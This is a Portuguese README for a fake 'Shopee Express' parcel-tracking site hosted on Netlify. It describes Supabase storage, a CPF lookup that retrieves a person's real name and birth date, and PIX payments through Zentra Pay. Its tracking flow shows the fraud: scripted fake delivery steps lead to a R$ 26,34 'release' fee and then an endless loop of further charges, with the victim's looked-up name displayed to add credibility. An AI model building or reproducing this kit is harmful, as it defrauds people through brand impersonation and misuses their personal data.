# Sistema de Rastreamento Shopee Express

## 🔧 Configuração do Supabase

### 1. Configurar Credenciais

Edite o arquivo `src/config/supabase.js` e substitua pelas suas credenciais reais:

```javascript
const supabaseUrl = "https://SEU_PROJETO.supabase.co";
const supabaseKey = "SUA_CHAVE_PUBLICA";
```

### 2. Configurar API de CPF

Edite o arquivo `src/services/cpf-api-service.js` e configure sua API:

```javascript
this.apiUrl = 'https://SUA_API_DE_CPF.com/api';
```

### 3. Executar Migrações

No painel do Supabase, execute os seguintes scripts SQL:

1. **Tabela de Consultas**: `supabase/migrations/create_consultas_table.sql`
2. **Tabela de Rastreamentos**: `supabase/migrations/create_rastreamentos_table.sql`

### 4. CPF de Teste

O sistema está configurado para usar o CPF de teste: `011.011.011-05`

Você pode alterar dinamicamente pela interface ou modificar em `src/services/cpf-api-service.js`

## 🚀 Lógica de Funcionamento

### ✅ Consulta de CPF (Lógica Exata)
```javascript
// ⚠️ Primeiro tenta carregar dados do Supabase
let { data: consulta, error } = await supabase
  .from("consultas")
  .select("*")
  .eq("cpf", cpf)
  .single();

// ⚠️ Se não existir ou estiver com nome errado, busca na API de CPF
if (!consulta || !consulta.nome || consulta.nome === "Fernanda Santos") {
  const response = await fetch("https://SUA_API_DE_CPF.com/api?cpf=" + cpf);
  const api = await response.json();

  if (api?.status === 200 && api?.nome) {
    // Salva ou atualiza os dados no Supabase
    await supabase.from("consultas").upsert({
      cpf: cpf,
      nome: api.nome,
      nascimento: api.nascimento,
      data_consulta: new Date().toISOString()
    });

    // Atualiza a variável local para exibir corretamente
    consulta = {
      cpf: cpf,
      nome: api.nome,
      nascimento: api.nascimento
    };
  }
}

// Retorno para interface Bolt
return {
  nome: consulta?.nome || "Nome não encontrado",
  cpf: cpf,
  status: "ok"
};
```

### ✅ Fluxo de Rastreamento
- **Etapas 1-10**: Automáticas com timers (2h + 1-20min aleatórios)
- **Etapa 11**: Botão "Liberar Objeto" (R$ 26,34)
- **Etapas 12-15**: Pós-taxa com timers reais
- **Loop 16-21**: Tentativas infinitas (R$ 7,74 → R$ 12,38 → R$ 16,46)

### ✅ Integração Zentra Pay
- QR Code real para pagamentos
- PIX funcional com chave copia e cola
- Simulação de pagamento para testes

## 🧪 Teste

Acesse: `https://shopeeexpressrastreio.netlify.app/rastreamento.html?focus=cpf&cpf=01101101105`

## 📊 Logs de Debug

O sistema inclui logs detalhados para verificar:
- Consultas no Supabase
- Chamadas para API de CPF
- Dados salvos e atualizados
- Nomes exibidos na interface
- Fluxo de etapas e timers

Verifique o console do navegador para acompanhar o funcionamento.

## 🔧 Configurações Importantes

1. **Supabase**: Configure URL e chave pública
2. **API de CPF**: Configure endpoint da sua API
3. **CPF de Teste**: `011.011.011-05` (configurável)
4. **Fallback**: Sistema funciona mesmo sem Supabase configurado